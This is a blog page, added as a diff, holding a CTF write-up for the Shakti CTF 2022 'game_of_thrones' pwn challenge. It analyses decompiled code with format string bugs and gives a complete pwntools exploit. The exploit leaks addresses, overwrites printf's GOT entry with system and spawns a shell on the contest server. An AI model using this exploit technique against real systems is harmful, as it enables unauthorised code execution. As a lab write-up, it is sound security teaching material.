@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Info(10&#x2F;387) solves MediumT descriptionHelp capture king’s landing and defeat the night walkers and his army of the dead!Note: The server is running on Ubuntu 20.04.Author: d1g174l_f0rtr355 for p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shakti CTF 2022 - game_of_thrones (medium)">
+<meta property="og:url" content="https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="Info(10&#x2F;387) solves MediumT descriptionHelp capture king’s landing and defeat the night walkers and his army of the dead!Note: The server is running on Ubuntu 20.04.Author: d1g174l_f0rtr355 for p">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-13T23:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-22T18:47:30.711Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="fsb">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!-- title -->
+    <title>Shakti CTF 2022 - game_of_thrones (medium)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/12/22/221222-shaktictf2022-phrack_crack/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/12/07/221207-infosecctf2022-secure_passstorev2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&text=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&is_video=false&description=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shakti CTF 2022 - game_of_thrones (medium)&body=Check out this article: https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&title=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&name=Shakti CTF 2022 - game_of_thrones (medium)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/2022/12/14/221214-shaktictf2022-game_of_thrones/&t=Shakti CTF 2022 - game_of_thrones (medium)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Analysis"><span class="toc-number"></span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">0.2.</span> <span class="toc-text">Source Code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-use-dragons"><span class="toc-number">0.2.1.</span> <span class="toc-text">1. use_dragons()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-kings-landing-amp-num-men-amp-num-dragons"><span class="toc-number">0.2.2.</span> <span class="toc-text">2. kings_landing(&amp;num_men, &amp;num_dragons)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-white-walkers-amp-num-men-amp-num-dragons"><span class="toc-number">0.2.3.</span> <span class="toc-text">3. white_walkers(&amp;num_men, &amp;num_dragons)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">2.3.</span> <span class="toc-text">flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Shakti CTF 2022 - game_of_thrones (medium)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-13T23:00:00.000Z" itemprop="datePublished">2022-12-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fsb/" rel="tag">fsb</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(10&#x2F;387) solves</p>
+<p>MediumT</p>
+<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Help capture king’s landing and defeat the night walkers and his army of the dead!<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p>
+<h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c</span><br><span class="line">└── libc.so.6</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /glibc/2.27/64/lib/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d246cab5927d94da0823f90a45d0373f433066ab, not stripped</span><br></pre></td></tr></table></figure>
+
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  initialize(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|\tWelcome to Game of Thrones (GOT)\t|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================================================\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The goal is simple! You need to become the ruler of the seven kingdoms!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = getchar();</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      white_walkers(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">      exit_function(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      num_dragons = use_dragons();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      kings_landing(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The main function has a 3 functions to keep an eye on.</p>
+<ol>
+<li>num_dragons &#x3D; use_dragons();</li>
+<li>kings_landing(&amp;num_men, &amp;num_dragons);</li>
+<li>white_walkers(&amp;num_men, &amp;num_dragons);</li>
+</ol>
+<p>Let’s take a look at each one.</p>
+<h4 id="1-use-dragons"><a href="#1-use-dragons" class="headerlink" title="1. use_dragons()"></a>1. <code>use_dragons()</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSay something in Valyrian: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The dragons say: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In this function, format variable receives 10 characters from player and outputs them as they are. Since <code>printf()</code> doesn’t specify a format string when printing, the <strong>Format String Bug(FSB)</strong> possibility exists.</p>
+<p>The return value 3 is stored in <code>num_dragons</code> that global variable.</p>
+<h4 id="2-kings-landing-amp-num-men-amp-num-dragons"><a href="#2-kings-landing-amp-num-men-amp-num-dragons" class="headerlink" title="2. kings_landing(&amp;num_men, &amp;num_dragons)"></a>2. <code>kings_landing(&amp;num_men, &amp;num_dragons)</code></h4><p>In this funciton, the main parts of the functon are as follows.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *num_dragons &amp;&amp; *num_dragons &lt;= <span class="number">3u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;How many dragons would you like to use ?\n&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;use_dragons);</span><br><span class="line">      <span class="keyword">if</span> ( use_dragons &amp;&amp; use_dragons &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *num_dragons -= use_dragons;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n&gt; &quot;</span>, use_dragons);</span><br><span class="line">        getchar();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%50[^\n]s&quot;</span>, format);</span><br><span class="line">        <span class="built_in">printf</span>(format);                         <span class="comment">// fsb</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You only use dragons that you have&quot;</span>);</span><br><span class="line">        exit_function(<span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>We can use the 3 dragons. It means we have the <strong>3 chances with FSB</strong> in this function. However, the <code>use_dragons()</code> must precede this function.</p>
+<h4 id="3-white-walkers-amp-num-men-amp-num-dragons"><a href="#3-white-walkers-amp-num-men-amp-num-dragons" class="headerlink" title="3. white_walkers(&amp;num_men, &amp;num_dragons)"></a>3. <code>white_walkers(&amp;num_men, &amp;num_dragons)</code></h4><p>There is no meaningful code to find vulnerablilties.</p>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>In <code>use_dragons()</code> function, There is 1 FSB.<br>In <code>kings_landing()</code> function, There are 3 chances with FSB.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The exploit progressed relatively quickly in the local environment, but took a long time in the remote envireonment. I guess it’s because of libc version.</p>
+<p>(It may be my mistake that I downloaded the wrong libc from CTF web site..)</p>
+<p>Even though libc was given, this version doesn’t seem to match from remote environment, so I guessed the offset. Except for the offset, the exploit is same as in the local environment. <strong>So the offest is dirty because it was obtained by guessing.</strong></p>
+<h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>We have to leak the base address of the binary and libc using <strong>FSB that in <code>use_dragons()</code></strong>. After getting the bases, we know the address of ‘printf()’ in binary and <code>system()</code> in libc. So we can overwriting <code>system()</code> to <code>printf@got</code>. In this case, it uses <strong>the FSB triggered by the <code>kings_landing()</code></strong>. </p>
+<p>I use the <code>fmtstr_payload</code> in pwntools for comfortable. The FSB payload has a 50 length limit, so I use the <code>write_size</code> argument and only 4 bytes of the <code>system()</code> for overwriting.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>After overwriting, When the <code>printf()</code> is executed, the <code>system()</code> will be executed. We need to focus on the <code>printf()</code> that has only one argument. That argument is our input. It means that we have to find <code>pirntf(input);</code> same as <code>system(input);</code>. </p>
+<p>It is not implemented in the exploit code, but after interactive we can execute the <code>use_dragons()</code> and sent the <code>sh</code> string to the part that receives the input values.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format); <span class="comment">// system(format);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>You may be wondering if it’s okay to pass invalid arguments to the <code>system()</code>. For example as below.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// printf(&quot;\n\nYou currently have %d number of dragons.\n&quot;, 3LL);</span></span><br><span class="line">system(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>It just prints an error saying it can’t run but the binary isn’t exit.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: line 1: ff: command not found</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">32261</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">use_dragons</span>(<span class="params">fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;an:&#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kings_landing</span>(<span class="params">use, fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;ns\n\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(use))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">white_walkers</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    use_dragons(<span class="string">&#x27;%17$p%39$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    libc.address = leak-<span class="number">0x80</span>-<span class="number">0x23800</span>-<span class="number">0x800</span>-<span class="number">3</span></span><br><span class="line">    <span class="comment"># libc.address = leak - 0x851f0</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">    info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># printf got -&gt; system</span></span><br><span class="line">    system = libc.address + <span class="number">0x55410</span>+<span class="number">0x100</span>-<span class="number">0x3180</span>-<span class="number">0x100</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="comment"># if len(payload) &gt; 50:</span></span><br><span class="line">        <span class="comment"># p.close()</span></span><br><span class="line">        <span class="comment"># continue</span></span><br><span class="line">    <span class="comment"># print(len(payload))</span></span><br><span class="line">    kings_landing(<span class="number">1</span> ,payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd</span></span><br><span class="line"><span class="comment"># In sue_dragons() function,</span></span><br><span class="line"><span class="comment"># system(&#x27;sh&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>I used loop bescause of offset prediction and FSB payload length.</p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaktictf&#123;F0rm4T_S7r1ng5_4nd_G0T_0v3Rwr17e_4r3_7h3_r34l_k1ll3rs_4d9ddd93416dd1881ae5a725a2cb0058&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
